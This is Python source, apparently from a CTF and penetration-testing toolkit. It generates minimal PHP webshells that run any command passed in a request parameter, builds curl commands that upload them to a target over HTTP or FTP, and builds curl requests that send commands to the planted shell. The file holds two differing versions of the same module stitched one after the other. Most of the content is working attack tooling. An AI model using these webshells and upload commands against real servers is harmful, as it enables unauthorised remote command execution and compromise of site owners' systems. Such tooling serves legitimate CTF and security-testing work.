"""PHP webshell and curl utilities for web exploitation.

This module provides helpers for generating a minimal PHP webshell string and
constructing a curl command to upload it. Intended for CTF and testing utilities
within the CAI project. Keep outputs inert (do not execute uploads).
"""
# pylint: disable=unused-argument  # noqa: E501


def generate_php_webshell(target_url=None, port=None, protocol="http", ctf=None):
    """Generate a small PHP webshell payload.

    Args:
        target_url: Target URL (not used by generator, included for interface parity)
        port: Port number (optional)
        protocol: Protocol string (e.g., "http").
        ctf: Optional CTF helper/context object.

    Returns:
        Tuple[str, str]: (shell_content, hint_upload_command)
    """
    # A deliberately minimal, non-obfuscated PHP webshell useful for CTFs.
    shell = (
        "<?php\n"
        "if (isset($_REQUEST['cmd'])) {\n"
        "    $cmd = ($_REQUEST['cmd']);\n"
        "    system($cmd);\n"
        "}\n"
        "?>"
    )

    hint_cmd = f"# Create file 'shell.php' containing the above payload and upload it to the target."
    return shell, hint_cmd


def generate_curl_upload_cmd(url, filename="shell.php", ctf=None):
    """Generates a curl command to upload a PHP webshell.

    Args:
        url: Target URL for upload
        filename: Name of shell file (default: shell.php)
        ctf: Optional CTF object to use for context

    Returns:
        Tuple[str, str]: (shell_content, curl_command)
    """
    shell, _ = generate_php_webshell()
    curl_cmd = f"curl -X POST '{url}' -F \"file=@{filename}\""
    return shell, curl_cmd
"""
PHP webshell and curl utilities for web exploitation
"""
import shlex
from urllib.parse import quote_plus


def generate_php_webshell(target_url=None, port=None,
                          protocol="http", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
    """
    Upload and generate a basic PHP webshell and uploads it via HTTP or FTP

    Args:
        target_url: Target URL to upload shell to
        port: Port number to use (default: 80 for HTTP, 21 for FTP)
        protocol: Protocol to use - 'http' or 'ftp' (default: http)
        ctf: CTF object to use for context

    Returns:
        Tuple of (webshell content, upload command)
    """
    webshell = """<?php system($_GET['cmd']); ?>"""

    # Always return a tuple: (webshell_content, upload_command_or_None)
    upload_cmd = None

    if not target_url:
        return webshell, upload_cmd

    if not port:
        port = 21 if protocol == "ftp" else 80

    # Build upload command that reads the shell from stdin so we don't
    # create files on disk as a side-effect. Use shlex.quote to safely
    # embed the literal webshell in a shell-safe printf invocation.
    quoted = shlex.quote(webshell)
    if protocol == "ftp":
        upload_cmd = f"printf %s {quoted} | curl -T - ftp://{target_url}:{port}/shell.php"
    else:
        upload_cmd = (
            f"printf %s {quoted} | curl -X POST http://{target_url}:{port} "
            f"-F 'file=@-;filename=shell.php'"
        )

    return webshell, upload_cmd


def curl_webshell(url, command, cmd_param="cmd"):
    """
    Sends command to PHP webshell via curl

    Args:
        url: URL of the webshell
        command: Command to execute
        cmd_param: GET parameter name for command (default: cmd)

    Returns:
        Command to execute with curl
    """
    encoded_cmd = quote_plus(command)
    return f"curl '{url}?{cmd_param}={encoded_cmd}'"


def upload_webshell(url, filename="shell.php", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
    """
    Generates curl command to upload PHP webshell

    Args:
        url: Target URL for upload
        filename: Name of shell file (default: shell.php)
        ctf: CTF object to use for context

    Returns:
        Tuple of (webshell content, curl upload command)
    """
    shell, _ = generate_php_webshell()
    quoted = shlex.quote(shell)
    curl_cmd = (
        f"printf %s {quoted} | curl -X POST {url} -F 'file=@-;filename={filename}'"
    )
    return shell, curl_cmd
